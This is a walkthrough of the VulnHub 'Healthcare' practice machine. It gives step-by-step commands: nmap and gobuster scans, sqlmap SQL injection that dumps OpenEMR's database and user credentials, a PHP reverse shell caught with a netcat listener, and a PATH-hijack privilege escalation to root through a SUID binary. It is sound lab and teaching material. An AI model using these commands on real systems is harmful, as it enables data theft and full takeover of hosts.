# healthcare-walkthrough
a walkthrough for healthcare machine from vulnhub
hello all today im walking throih with a new machine "healthcare"

first we need to know what our machine ip is so 

```bash
nmap -sn 10.10.0.0/24 #for you the network might be different
```
for me machine ip is 

```
10.10.0.21
```
now first thing come to mind is to see open ports and the services that running

```
nmap -p- -A 10.10.0.21 -oN nmapscan.txt
```
-p- to scan all ports #the defult scan only scan the first 1000 port

-A for  enables OS detection, version detection, script scanning, and traceroute

we got 2 ports open 

21/tcp open  ftp     ProFTPD 1.3.3d

80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))

i first searched for the 21 port but no vulnerabilities was out there so getting to the http port

nothing were there in the page nor the source code 

for further enumeration lets try gobuster

i tried this enumeration multiple times with multiple lists finally got something back with 

```
gobuster dir -u http://10.10.0.21 -w /usr/share/wordlists/seclists/Discovery/Web-content/directory-list-2.3-big.txt -t 100 -e php, txt
```

-t for the threads

-e to search for txt file also

![image](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/5a58e724-5f9c-498b-96c6-4c5ad5171867)


![image](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/822a4d43-2b6e-4dbb-8c36-9d87f86869f2)


googling the "OpenEMR v4.1.0"

https://www.exploit-db.com/exploits/49742

following along with this exploit we found that its vulnerable to sqli with the url of 

http://example.com/interface/login/validateUser.php?u=

so i did enumerate with sqlmap 

```
sqlmap -u http://10.10.0.21/openemr/interface/login/validateUser.php?u= --dump-all --all --batch
```

simplifing the command 

-u http://10.10.0.21/openemr/interface/login/validateUser.php?u=: This option specifies the target URL that you want to test for SQL injection.

--dump-all: This option tells sqlmap to dump all the data from the database once a successful SQL injection is found. This includes tables, columns, and their contents.

--all: This option instructs sqlmap to perform all the available tests and techniques to exploit the SQL injection vulnerability.

--batch: This option enables the batch mode, which means that sqlmap will automatically choose the default options without asking for user interaction.

![image 3](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/3197c392-416b-405e-9c44-265342ad28a8)

we found interesting database name 

![image 2](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/ff876401-e4b8-467b-9af7-b88cf02410e0)

now wtih the database name openemr
i got lucky guessing the table name of users

```
sqlmap -u http://10.10.0.21/openemr/interface/login/validateUser.php?u=  -D openemr -T users --dump   
```

simplifing the command

-D openemr: This option specifies the name of the target database.

-T users: This option specifies the name of the target table within the database.

--dump: This option tells sqlmap to perform a database dump specifically on the specified table. It will retrieve and display all the data from the targeted table.

![image 4](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/ce125803-ac85-44ff-89f6-9248d6551f46)

we got some creds now for 'admin' and 'medical'

i logged in and wrote a php revshell i used 'PHP PentestMonkey' you can fid it and more revs here

[revshell.com 
](https://www.revshells.com/)

![image 5](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/58d6bce8-bacf-444f-868b-dd175f70421a)

on my machine i setuped a netcat listener 

```
nc -nlvp 9001
```

![image 6](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/67fd2405-83ba-4fca-9fc9-c16de086b438)

boom!!! we are in

now lets do a privilege escalation

doing some basic manual enumeration like getting a version of the kernal and stuff
you can find this link very usefull to know where to look and why 

https://book.hacktricks.xyz/linux-hardening/privilege-escalation

looking into /etc/passwd file we notice that thier a user there name medical 

so lets try to switch user with the creds we got from the database

the good new that it works now lets try again with the new user 

when running the command we will get somethhing interesting

```
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
![image 7](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/d49caad8-e541-413f-ac43-6fadfc976773)

seeing what inside the string we get

![image 8](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/9d9ae133-2ad5-4227-9e2c-eea85e1079f0)

we can use either ofconfig or fdisk

![image 9](https://github.com/0xA4O/healthcare-walkthrough/assets/57577405/229e422f-6be3-427d-b888-83f8597d5e88)

now simplifing the command to get better understanding of whats going here 

here the string helthcare the user medical can run as a root withoud password 

the good thing that when the string runs it goes and call ifconfig and fdisk 

what the system does to get the ifconfig or the fdisk is to search across the $PATH one by one to get better understanding type in the command 

```
echo $PATH
```
those strings you got system will go through them now we might fool the system and create a file named "ifconfig" and add a new dir to the $PATH so it runs first 

```
cd /tmp # i used tmp because its for sure will have a write permission 
```
```
echo "/bin/bash" > ifconfig #this creates a new file calling the bash and here when called will be called in the root perm
```
```
chmod +x ifconfig # to make an excutable file
```
```
export PATH=/tmp:$PATH #this add the current dir to the path 
```
```
/usr/bin/healthcheck # now after preparing the file and the path calling out the string with root privileges
```

congratulations you are now root!!!
